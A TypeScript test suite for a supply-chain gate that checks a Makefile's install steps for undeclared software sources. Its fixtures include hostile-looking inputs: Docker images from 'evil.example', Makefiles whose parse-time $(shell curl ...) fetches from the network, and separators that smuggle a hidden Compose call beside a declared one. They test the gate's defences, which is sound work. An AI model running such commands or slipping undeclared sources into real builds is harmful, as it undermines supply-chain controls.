import {
  dryRunInstallationGraph,
  findUndeclaredSources,
} from "./check-software-sources.ts";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { expect, test } from "bun:test";
import {
  inventoryComposeSources,
  inventorySources,
} from "./software-source-inventory.ts";
import { resolve } from "node:path";
import { tmpdir } from "node:os";

const repositoryRoot = resolve(import.meta.dir, "..");
const gate = resolve(import.meta.dir, "check-software-sources.ts");
type CommandResult = Readonly<{
  exitCode: number;
  stderr: string;
  stdout: string;
}>;

function runGate(makefile: string): CommandResult {
  const result = Bun.spawnSync({
    cmd: [process.execPath, gate, makefile],
    cwd: repositoryRoot,
    stderr: "pipe",
    stdout: "pipe",
  });
  return {
    exitCode: result.exitCode,
    stderr: result.stderr.toString(),
    stdout: result.stdout.toString(),
  };
}

test("the supported installation graph has no undeclared source", () => {
  const result = runGate(resolve(repositoryRoot, "Makefile"));

  expect(result.stderr).toBe("");
  expect(result.exitCode).toBe(0);
});

test("the supported installation graph retains web retrieval", () => {
  const makefile = resolve(repositoryRoot, "Makefile");
  const graph = dryRunInstallationGraph(makefile);
  const sources = [
    ...inventorySources(graph),
    ...inventoryComposeSources(graph, makefile),
  ];

  expect(sources).toContain("docker:pyd4vinci/scrapling");
  expect(sources).toContain("docker:cloakhq/cloakbrowser:0.5.3");
});

test("the reconciled tools use their supported Homebrew artifacts", () => {
  const graph = dryRunInstallationGraph(resolve(repositoryRoot, "Makefile"));

  expect(graph).toContain("brew install fzf");
  expect(graph).toContain("brew install --cask cursor-cli");
  expect(graph).toContain("brew trust --cask wezterm/wezterm/wezterm-nightly");
  expect(graph).toContain(
    "brew install --cask wezterm/wezterm/wezterm-nightly",
  );
  expect(graph).toContain("brew trust --cask dopplerhq/doppler/doppler");
  expect(graph).toContain("brew install --cask dopplerhq/doppler/doppler");
  expect(graph).not.toContain("wez/wezterm");
  expect(graph).not.toContain("dopplerhq/cli");
  expect(graph).toContain(
    "brew update\nbrew install --cask --adopt vibe-island",
  );
});

test.each([
  ["another HTTPS download", "wget https://downloads.example.test/tool.dmg"],
  ["an SCP-style Git source", "git clone git@example.test:tools/tool.git"],
  ["Cargo", "cargo install tool"],
  ["Go", "go install example.test/tool@latest"],
  ["RubyGems", "gem install tool"],
  ["pip", "pipx install tool"],
  ["uv", "uv tool install tool"],
  ["npx", "npx tool install"],
])("refuses %s as an undeclared source", (_name, command) => {
  const sources = inventorySources(command);

  expect(findUndeclaredSources(sources, [])).not.toEqual([]);
});

test("does not confuse an allowed manager with a new source channel", () => {
  const sources = inventorySources("brew install --cask example");

  expect(findUndeclaredSources(sources, ["channel:homebrew"])).toEqual([]);
});

test.each(["pull", "run"])(
  "requires each Docker %s image to be declared separately",
  (command) => {
    const sources = inventorySources(
      `docker ${command} evil.example/team/tool:latest`,
    );

    expect(findUndeclaredSources(sources, ["channel:docker"])).toEqual([
      "docker:evil.example/team/tool:latest",
    ]);
  },
);

test("refuses an undeclared image from a reached Compose file", () => {
  const directory = mkdtempSync(resolve(tmpdir(), "software-sources-compose-"));
  const makefile = resolve(directory, "Makefile");
  writeFileSync(
    makefile,
    "all:\n\t@brew install example\n\t@docker compose -f compose.yml up -d\n",
  );
  writeFileSync(
    resolve(directory, "compose.yml"),
    "services:\n  example:\n    image: evil.example/team/tool:latest\n",
  );

  try {
    const result = runGate(makefile);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("docker:evil.example/team/tool:latest");
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});

test.each([";", "&", "|"])(
  "refuses a noncanonical Compose call beside a canonical call with %s",
  (separator) => {
    const directory = mkdtempSync(
      resolve(tmpdir(), "software-sources-compose-"),
    );
    const makefile = resolve(directory, "Makefile");
    writeFileSync(
      makefile,
      `all:\n\t@brew install example\n\t@docker compose --file hidden.yml up -d ${separator} docker compose -f declared.yml up -d\n`,
    );

    try {
      const result = runGate(makefile);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toContain("compose:unsupported-syntax");
    } finally {
      rmSync(directory, { force: true, recursive: true });
    }
  },
);

test.each([
  "docker compose --file compose.yml up -d",
  "docker compose --file=compose.yml up -d",
  "docker compose up -d",
  "docker --context desktop-linux compose -f compose.yml up -d",
])("refuses unsupported Compose syntax: %s", (composeCommand) => {
  const directory = mkdtempSync(resolve(tmpdir(), "software-sources-compose-"));
  const makefile = resolve(directory, "Makefile");
  writeFileSync(
    makefile,
    `all:\n\t@brew install example\n\t@${composeCommand}\n`,
  );

  try {
    const result = runGate(makefile);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("compose:unsupported-syntax");
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});

test("fails closed when the Makefile is unreadable", () => {
  const result = runGate(resolve(repositoryRoot, "missing-Makefile"));

  expect(result.exitCode).not.toBe(0);
  expect(result.stderr).toContain("ENOENT");
});

test("fails closed when make is unavailable", () => {
  expect(() =>
    dryRunInstallationGraph(
      resolve(repositoryRoot, "Makefile"),
      "/missing/make",
    ),
  ).toThrow();
});

test("fails closed when the graph canary is absent", () => {
  const directory = mkdtempSync(resolve(tmpdir(), "software-sources-"));
  const makefile = resolve(directory, "Makefile");
  writeFileSync(makefile, "all:\n\t@echo local-only\n");

  try {
    const result = runGate(makefile);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain(
      "installation graph canary missing: channel:homebrew",
    );
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});

test("does not execute parse-time shell while inspecting the graph", () => {
  const directory = mkdtempSync(resolve(tmpdir(), "software-sources-shell-"));
  const makefile = resolve(directory, "Makefile");
  const marker = resolve(directory, "executed");
  writeFileSync(
    makefile,
    `PROBE:=$(shell curl https://downloads.example.test/tool -o ${marker})\nall:\n\t@brew install example\n`,
  );

  try {
    const result = runGate(makefile);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("https://downloads.example.test/tool");
    expect(existsSync(marker)).toBe(false);
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});

test("finds a source after a nested parse-time expansion", () => {
  const directory = mkdtempSync(resolve(tmpdir(), "software-sources-shell-"));
  const makefile = resolve(directory, "Makefile");
  const marker = resolve(directory, "executed");
  writeFileSync(
    makefile,
    `PROBE:=$(shell value=$(OTHER); curl https://nested.example.test/tool -o ${marker})\nall:\n\t@brew install example\n`,
  );

  try {
    const result = runGate(makefile);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("https://nested.example.test/tool");
    expect(existsSync(marker)).toBe(false);
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});
